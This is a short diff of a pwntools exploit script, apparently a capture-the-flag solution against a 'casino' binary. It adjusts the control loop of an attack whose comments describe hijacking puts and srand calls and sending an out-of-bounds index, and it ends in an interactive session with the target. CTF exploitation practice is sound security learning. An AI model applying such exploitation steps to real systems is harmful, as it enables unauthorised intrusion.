@@ -35,7 +35,7 @@ r.sendlineafter('name: ', name)
 r.sendlineafter('age: ', '87')
 
 step = 1
-while True:
+while step < 4:
 
     # Step 1: make call puts change back to call casino, and we can hijack srand to make it printf
     if step == 1:
@@ -64,7 +64,6 @@ while True:
         offset = (0x20 - 0xd0) / 4
         r.sendlineafter('0:no]:', '1')
 
-        pause()
         r.sendlineafter('6]:', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) +': '
@@ -73,7 +72,9 @@ while True:
         step += 1
     # do tomorrow!
     elif step == 3:
-        exit()
+        print('back to casino?')
+        pause()
+        step += 1
 
 r.interactive()
 r.close()
